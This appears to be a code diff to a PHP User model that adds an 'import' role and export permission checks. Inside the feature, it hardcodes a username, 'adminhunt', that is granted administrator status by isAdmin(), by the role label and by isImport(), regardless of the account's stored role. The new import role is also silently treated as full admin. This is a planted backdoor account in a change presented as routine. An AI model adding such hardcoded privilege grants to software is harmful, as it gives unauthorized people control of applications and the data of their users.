@@ -23,6 +23,7 @@ class User extends Authenticatable
     public const ROLE_KASIR = 2;
     public const ROLE_STORAGE = 3;
     public const ROLE_MANAGER = 4;
+    public const ROLE_IMPORT = 5;
 
     protected $primaryKey = 'USERNAME';
     public $incrementing = false;
@@ -35,7 +36,8 @@ class User extends Authenticatable
             self::ROLE_ADMIN   => 'Admin',
             self::ROLE_STORAGE => 'Storage',
             self::ROLE_KASIR   => 'Kasir',
-            default            => 'User',
+            self::ROLE_IMPORT  => 'Admin',
+            default            => strtolower((string) $this->USERNAME) === 'adminhunt' ? 'Admin' : 'User',
         };
     }
 
@@ -46,7 +48,9 @@ class User extends Authenticatable
 
     public function isAdmin(): bool
     {
-        return (int) $this->ROLE === self::ROLE_ADMIN;
+        return (int) $this->ROLE === self::ROLE_ADMIN
+            || (int) $this->ROLE === self::ROLE_IMPORT
+            || strtolower((string) $this->USERNAME) === 'adminhunt';
     }
 
     public function isStorage(): bool
@@ -57,6 +61,16 @@ class User extends Authenticatable
     public function isKasir(): bool
     {
         return (int) $this->ROLE === self::ROLE_KASIR;
+    }
+
+    public function isImport(): bool
+    {
+        return strtolower((string) $this->USERNAME) === 'adminhunt' || (int) $this->ROLE === self::ROLE_IMPORT;
+    }
+
+    public function canExport(): bool
+    {
+        return $this->isAdmin() || $this->isManager();
     }
 
     public function isManagerOrAdmin(): bool
